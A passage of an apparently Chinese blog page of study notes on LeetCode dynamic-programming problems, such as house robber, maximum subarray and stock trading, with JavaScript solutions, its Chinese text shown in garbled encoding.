é‡åˆ°éšœç¢ï¼Œä¸æ‰§è¡Œå½“å‰æ“ä½œï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€å¾ªç¯</span></span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[i][j] === <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-6"><a href="#æ€è·¯2-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>ä¸€ç»´æ•°ç»„ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePathsWithObstacles = <span class="function"><span class="keyword">function</span>(<span class="params">obstacleGrid</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> m = obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="comment">// dp æ•°ç»„åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>);</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[i][j] === <span class="number">1</span>) &#123;</span><br><span class="line">                dp[j] = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// j &gt; 0 å¾ˆå…³é”®</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(j &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                dp[j] += dp[j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode1143â€”â€”æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode1143â€”â€”æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode1143â€”â€”æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode1143â€”â€”æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/longest-common-subsequence/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-5"><a href="#æ€è·¯-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestCommonSubsequence = <span class="function"><span class="keyword">function</span>(<span class="params">text1, text2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!text1 || !text2) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> m = text1.length, n = text2.length;</span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m + <span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dp.length; i++)&#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n + <span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (text1[i - <span class="number">1</span>] === text2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">Math</span>.max(dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/26/k85qZCWGbFUlzAf.png" alt="image.png"></p><p>è¦å­¦ä¼šæŠŠè¿™é“é¢˜ç›®å˜æˆäºŒç»´æ•°ç»„çš„ dp é—®é¢˜ã€‚</p><h2 id="LeetCode1143â€”â€”ä¸‰è§’å½¢æœ€å°è·¯å¾„å’Œï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode1143â€”â€”ä¸‰è§’å½¢æœ€å°è·¯å¾„å’Œï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode1143â€”â€”ä¸‰è§’å½¢æœ€å°è·¯å¾„å’Œï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode1143â€”â€”ä¸‰è§’å½¢æœ€å°è·¯å¾„å’Œï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/triangle/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯1-amp-é¢˜è§£-8"><a href="#æ€è·¯1-amp-é¢˜è§£-8" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>DP:</p><ul><li>é‡å¤æ€§ï¼ˆåˆ†æ²»ï¼‰ <code>problem(i, j) = min(sub(i+1, j), sub(i+1, j+1)) + a[i, j]</code></li><li>å®šä¹‰çŠ¶æ€æ–¹ç¨‹ <code>f[i, j]</code></li><li>DPæ–¹ç¨‹ <code>f[i, j] = min(f[i+1, j], f[i+1, j+1]) + a[i, j]</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minimumTotal = <span class="function"><span class="keyword">function</span>(<span class="params">triangle</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ç›´æ¥å°† triangle å­˜åœ¨ dp ä¸­</span></span><br><span class="line">    <span class="keyword">let</span> dp = triangle;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = dp.length - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; dp[i].length; j++)&#123;</span><br><span class="line">            dp[i][j] += <span class="built_in">Math</span>.min(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶å®ç”šè‡³å¯ä»¥ä¸è®¾ dp ç›´æ¥è¿”å› triangle[0][0]ã€‚</p><h3 id="æ€è·¯2-amp-é¢˜è§£-7"><a href="#æ€è·¯2-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minimumTotal = <span class="function"><span class="keyword">function</span> (<span class="params">triangle</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = triangle[triangle.length-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = triangle.length - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; triangle[i].length; j++)&#123;</span><br><span class="line">            res[j] = <span class="built_in">Math</span>.min(res[j], res[j + <span class="number">1</span>]) + triangle[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode53â€”â€”æœ€å¤§å­åºå’Œï¼ˆâ˜†ï¼‰"><a href="#LeetCode53â€”â€”æœ€å¤§å­åºå’Œï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode53â€”â€”æœ€å¤§å­åºå’Œï¼ˆâ˜†ï¼‰"></a>LeetCode53â€”â€”æœ€å¤§å­åºå’Œï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/maximum-subarray/">è·³è½¬åœ°å€</a></p><p>è‡ªå·±åšåªä¼šæš´åŠ›æ±‚è§£ã€‚ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-6"><a href="#æ€è·¯-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><ul><li>DP[i]è¡¨ç¤º nums ä¸­ä»¥ nums[i] ç»“å°¾çš„æœ€å¤§å­åºå’Œï¼Œå–å†³äº DP[i - 1] + nums[i] &gt; nums[i] ,å¦‚æœ nums[i] å¤§ï¼Œåˆ™ä» nums[i] å¼€å§‹å•ç‹¬æˆä¸€æ®µï¼Œå¦åˆ™ä¸ä¹‹å‰çš„è¿æˆä¸€æ®µã€‚</li><li>æ‰€ä»¥å¯å¾— DP æ–¹ç¨‹ <code>dp[i] = Math.max(nums[i], dp[i - 1] + nums[i])</code> ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">maxSubArray</span>(<span class="params">nums: number[]</span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> dp = [...nums];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// è¦ä¹ˆè‡ªæˆä¸€æ®µï¼Œè¦ä¹ˆå’Œå‰é¢å­æ•°ç»„åˆå¹¶</span></span><br><span class="line">        dp[i] = <span class="built_in">Math</span>.max(nums[i], dp[i - <span class="number">1</span>] + nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(...dp);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å‘ç°DP[i]å…¶å®åªä¸DP[i - 1]æœ‰å…³ï¼ˆåªç”¨åˆ°äº†ä¸€ä¸ªå˜é‡ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸€ä¸ªå˜é‡ pre æ¥æ›¿ä»£ DP[i - 1]ï¼Œä»è€Œè®©ç©ºé—´å¤æ‚åº¦é™ä½åˆ° O(1)ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSubArray = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> pre = <span class="number">0</span>, dp = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        pre = <span class="built_in">Math</span>.max(pre + nums[i], nums[i]);</span><br><span class="line">        dp = <span class="built_in">Math</span>.max(dp, pre);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode152â€”â€”ä¹˜ç§¯æœ€å¤§å­åºåˆ—ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode152â€”â€”ä¹˜ç§¯æœ€å¤§å­åºåˆ—ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode152â€”â€”ä¹˜ç§¯æœ€å¤§å­åºåˆ—ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode152â€”â€”ä¹˜ç§¯æœ€å¤§å­åºåˆ—ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/maximum-product-subarray/submissions/">è·³è½¬åœ°å€</a></p><p>è‡ªå·±å†™ DP è¿˜æ˜¯æ²¡æœ‰ä»»ä½•æ€è·¯ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-7"><a href="#æ€è·¯-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProduct = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> prevMax = nums[<span class="number">0</span>], prevMin = nums[<span class="number">0</span>], result = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;nums.length;i++) &#123;</span><br><span class="line">        curMax = <span class="built_in">Math</span>.max(nums[i] * prevMax, nums[i], nums[i] * prevMin);</span><br><span class="line">        <span class="comment">// è€ƒè™‘è´Ÿæ•°æƒ…å†µï¼Œè¦ç®—å‡ºæœ€å°å€¼ å› ä¸ºæœ€å°å€¼* è´Ÿæ•° å¯èƒ½å°±æ˜¯å˜ä¸ºæœ€å¤§å€¼</span></span><br><span class="line">        curMin = <span class="built_in">Math</span>.min(nums[i] * prevMin, nums[i], nums[i] * prevMax);</span><br><span class="line">        prevMax = curMax</span><br><span class="line">        prevMin = curMin</span><br><span class="line"></span><br><span class="line">        result = <span class="built_in">Math</span>.max(curMax, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode198â€”â€”æ‰“å®¶åŠ«èˆï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode198â€”â€”æ‰“å®¶åŠ«èˆï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode198â€”â€”æ‰“å®¶åŠ«èˆï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode198â€”â€”æ‰“å®¶åŠ«èˆï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/house-robber/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯1-amp-é¢˜è§£-9"><a href="#æ€è·¯1-amp-é¢˜è§£-9" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><ul><li>é¦–å…ˆè€ƒè™‘èƒ½å¦ç”¨ä¸€ä½æ•°ç»„ DP ï¼Œä½†æ˜¯æ˜¾ç„¶ä¸èƒ½å­˜å‚¨â€å·â€æˆ–è€…â€æ²¡å·â€çš„çŠ¶æ€ï¼Œæ‰€ä»¥ä½¿ç”¨äºŒç»´æ•°ç»„ã€‚</li><li>a[i] è¡¨ç¤ºåˆ° i å¤©ä¸ºæ­¢<strong>èƒ½å·</strong>çš„æœ€å¤§å€¼ã€‚</li><li>DP æ–¹ç¨‹ï¼š<code>a[i][0] = Math.max(a[i - 1][0], a[i - 1][1]); a[i][1] = a[i - 1][0] + nums[i];</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rob = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = nums.length;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">let</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    a[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>).fill(<span class="number">0</span>);</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">// 0 ä¸å· 1å·</span></span><br><span class="line">  a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>, a[<span class="number">0</span>][<span class="number">1</span>] = nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">    a[i][<span class="number">0</span>] = <span class="built_in">Math</span>.max(a[i - <span class="number">1</span>][<span class="number">0</span>], a[i - <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">    a[i][<span class="number">1</span>] = a[i - <span class="number">1</span>][<span class="number">0</span>] + nums[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.max(a[n - <span class="number">1</span>][<span class="number">0</span>], a[n - <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-8"><a href="#æ€è·¯2-amp-é¢˜è§£-8" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><ul><li>ç”¨ a[i] è¡¨ç¤ºåˆ° i å¤©ä¸ºæ­¢<strong>å·²ç»å·åˆ°</strong>çš„æœ€å¤§ç°é‡‘ã€‚</li><li>DP æ–¹ç¨‹ï¼š<code>a[i] = Math.max(a[i - 1], a[i - 2] + nums[i]);</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rob = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = nums.length, a = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">  a[<span class="number">0</span>] = nums[<span class="number">0</span>], a[<span class="number">1</span>] = <span class="built_in">Math</span>.max(nums[<span class="number">0</span>], nums[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">let</span> res = <span class="built_in">Math</span>.max(a[<span class="number">0</span>], a[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</span><br><span class="line">    a[i] = <span class="built_in">Math</span>.max(a[i - <span class="number">1</span>], a[i - <span class="number">2</span>] + nums[i]);</span><br><span class="line">    res = <span class="built_in">Math</span>.max(res, a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ”¹è¿›æˆ Oï¼ˆ1ï¼‰çš„ç©ºé—´å¤æ‚åº¦ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rob = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> prevMax = <span class="number">0</span>, curMax = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> n <span class="keyword">of</span> nums) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp = curMax;</span><br><span class="line">        curMax = <span class="built_in">Math</span>.max(prevMax + n, curMax);</span><br><span class="line">        prevMax = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(curMax, prevMax);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode219â€”â€”æ‰“å®¶åŠ«èˆ-IIï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode219â€”â€”æ‰“å®¶åŠ«èˆ-IIï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode219â€”â€”æ‰“å®¶åŠ«èˆ IIï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode219â€”â€”æ‰“å®¶åŠ«èˆ IIï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/house-robber-ii/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-8"><a href="#æ€è·¯-amp-é¢˜è§£-8" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>DP æ–¹ç¨‹è¿˜æ˜¯æ²¡å˜ï¼Œåªæ˜¯å¤šè®¾ç½®äº†ä¸€ä¸ª dp æ•°ç»„ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rob = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = nums.length;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> nums[<span class="number">0</span>] || <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> dp1 = [nums[<span class="number">0</span>], <span class="built_in">Math</span>.max(nums[<span class="number">0</span>], nums[<span class="number">1</span>])];</span><br><span class="line">  <span class="keyword">const</span> dp2 = [<span class="number">0</span>, nums[<span class="number">1</span>]];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">2</span>; i &lt; n; i++) &#123;</span><br><span class="line">    dp1[i] = i === n - <span class="number">1</span> ? dp1[i - <span class="number">1</span>] : <span class="built_in">Math</span>.max(nums[i] + dp1[i - <span class="number">2</span>], dp1[i - <span class="number">1</span>]);</span><br><span class="line">    dp2[i] = <span class="built_in">Math</span>.max(nums[i] + dp2[i - <span class="number">2</span>], dp2[i - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.max(dp1[n - <span class="number">1</span>], dp2[n - <span class="number">1</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€è§„åˆ’â€”â€”ä¹°å–è‚¡ç¥¨"><a href="#åŠ¨æ€è§„åˆ’â€”â€”ä¹°å–è‚¡ç¥¨" class="headerlink" title="åŠ¨æ€è§„åˆ’â€”â€”ä¹°å–è‚¡ç¥¨"></a>åŠ¨æ€è§„åˆ’â€”â€”ä¹°å–è‚¡ç¥¨</h2><p>å…±æœ‰ä¸‰ä¸ªçŠ¶æ€ï¼š</p><ul><li>ç¬¬ i å¤©</li><li>äº¤æ˜“æ¬¡æ•° k</li><li>æ˜¯å¦æŒæœ‰è‚¡ç¥¨ ï¼ˆ0 ä¸æŒæœ‰ï¼Œ1 æŒæœ‰ï¼‰</li></ul><p>æ•…å¯ä»¥ç”¨ <code>dp[i][k][s]</code> è¡¨ç¤º DP çŠ¶æ€æ•°ç»„ï¼Œä¸”<code>dp[n-1][k][0]</code>æ˜¯æœ€åä¸€å¤©å…è®¸çš„æœ€å¤§äº¤æ˜“æ¬¡æ•°çš„æœ€å¤§åˆ©æ¶¦ã€‚</p><p>DPæ–¹ç¨‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä»Šå¤©ä¸æŒæœ‰è‚¡ç¥¨ã€‚æœ€å¤§åˆ©æ¶¦ä¸ºæ˜¨å¤©ä¸æŒæœ‰è‚¡ç¥¨çš„åˆ©æ¶¦ï¼Œæˆ–è€…ä»Šå¤©å–å‡ºæ˜¨å¤©è‚¡ç¥¨çš„åˆ©æ¶¦ã€‚</span></span><br><span class="line">dp[i][k][<span class="number">0</span>] = Max(dp[i-<span class="number">1</span>][k][<span class="number">0</span>], dp[i-<span class="number">1</span>][k][<span class="number">1</span>] + prices[i])</span><br><span class="line"><span class="comment">// ä»Šå¤©æŒæœ‰è‚¡ç¥¨ã€‚æœ€å¤§åˆ©æ¶¦ä¸ºæ˜¨å¤©æŒæœ‰è‚¡ç¥¨çš„åˆ©æ¶¦</span></span><br><span class="line">dp[i][k][<span class="number">1</span>] = Max(dp[i-<span class="number">1</span>][k][<span class="number">1</span>], dp[i-<span class="number">1</span>][k-<span class="number">1</span>][<span class="number">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>åˆå§‹æ•°ç»„ï¼š</p><ul><li><code>dp[-1][k][0] = 0</code>  å› ä¸ºä¸€å¤©ä» 0 å¼€å§‹ï¼Œè¿™é‡Œ i æ˜¯ -1</li><li><code>dp[-1][k][1] = -Infinity</code>  å› ä¸ºåœ¨ç¬¬ä¸€å¤©ä¹‹å‰ä¸èƒ½æŒæœ‰ä»»ä½•è‚¡ç¥¨</li><li><code>dp[i][0][0] = 0</code>  å› ä¸º k = 0ã€‚ä¸ä¼šæœ‰ä»»ä½•äº¤æ˜“ï¼Œæ‰€ä»¥åˆ©æ¶¦ä¸ºé›¶</li><li><code>dp[i][0][1] = -Infinity</code>  å› ä¸ºk = 0ã€‚ä¸èƒ½åœ¨ä¸å¼€å§‹äº¤æ˜“çš„æƒ…å†µä¸‹æŒæœ‰ä»»ä½•è‚¡ç¥¨</li></ul><h2 id="LeetCode122â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºï¼ˆâ˜†ï¼‰"><a href="#LeetCode122â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode122â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºï¼ˆâ˜†ï¼‰"></a>LeetCode122â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/#/description">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -13"><a href="#è‡ªå·±çš„ä»£ç -13" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">let</span> minPrice = prices[<span class="number">0</span>], profit = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; prices.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (prices[i] &lt; minPrice) &#123;</span><br><span class="line">      minPrice = prices[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (prices[i] - minPrice &gt; profit) &#123;</span><br><span class="line">      profit = prices[i] - minPrice;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> profit;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯-amp-é¢˜è§£-9"><a href="#æ€è·¯-amp-é¢˜è§£-9" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>é‡ç‚¹çœ‹åŠ¨æ€è§„åˆ’ï¼šå³ k=1 ã€‚ å½“ k ä¸º 1 æ—¶ï¼Œk çš„å­˜åœ¨ä¸ä¼šä»¥ä»»ä½•æ–¹å¼æ”¹å˜æ•°ç»„çŠ¶æ€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¿½ç•¥å®ƒã€‚</p><p>DP æ–¹ç¨‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>], <span class="number">0</span> - prices[i])</span><br></pre></td></tr></table></figure><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = prices.length;</span><br><span class="line">  <span class="keyword">let</span> dp = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">    dp[i] = [];</span><br><span class="line">    <span class="keyword">if</span>(i === <span class="number">0</span>)&#123;</span><br><span class="line">      dp[i][<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">      dp[i][<span class="number">1</span>] = -prices[i];</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[i][<span class="number">0</span>] = <span class="built_in">Math</span>.max(dp[i-<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>] + prices[i]);</span><br><span class="line">    dp[i][<span class="number">1</span>] = <span class="built_in">Math</span>.max(dp[i-<span class="number">1</span>][<span class="number">1</span>],  